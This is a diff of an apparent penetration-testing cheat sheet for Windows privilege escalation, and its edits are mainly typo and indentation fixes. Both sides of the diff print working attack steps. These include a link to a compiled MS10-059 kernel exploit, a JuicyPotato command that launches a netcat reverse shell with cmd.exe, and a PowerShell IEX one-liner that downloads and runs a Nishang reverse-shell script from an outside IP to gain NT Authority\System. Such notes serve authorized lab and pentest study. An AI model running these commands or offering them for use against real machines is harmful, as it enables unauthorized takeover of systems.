@@ -9,7 +9,7 @@
 
 # Windows Server 2008 R2 DataCenter :
 
---> If 6.1.7600 N/A Build 7600 version the use following exploit - https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
+--> If 6.1.7600 N/A Build 7600 version then use following exploit - https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
 
 # Microsoft Windows 7 Enterprise :
 
@@ -33,10 +33,11 @@ $_Affected_Windows_Verisons
 --> For CLSID - http://ohpe.it/juicy-potato/CLSID/
 
 ~ Command : juicypotato.exe -l 1337 -t * -p "C:\Windows\Tasks\nc.exe <IP> <port> -e cmd.exe"
-TIP : If upper command doesn't work then try to do the following thing:
-        1. Get ready with the nishang reverse shell script edit it with necessary data. Then create a bat file on any machine with IEX file downloader one-liner.--- echo powershell -c "IEX (new-object net.webclient).('http://10.10.16.5/shell.ps1')" > shell.bat ---
-        2. Then host a python web server and download the .bat file in target machine. After downloading run it as follows-
-        3. .\jp.exe -t * -l 1337 -p shell.bat (This will give shell as NT Authority\System) If this doesn't work then also change the CLSID using -c parameter.
+    TIP : If upper command doesn't work then try to do the following thing:
+    1. Get ready with the nishang reverse shell script edit it with necessary data.
+    Then create a bat file on any machine with IEX file downloader one-liner.--- echo powershell -c "IEX (new-object net.webclient).('http://10.10.16.5/shell.ps1')" > shell.bat ---
+    2. Then host a python web server and download the .bat file in target machine. After downloading run it as follows:
+    3. .\jp.exe -t * -l 1337 -p shell.bat (This will give shell as NT Authority\System) If this doesn't work then also change the CLSID using -c parameter.
 
 # PrinSpoofer Exploit on SEImpersonate : 
 
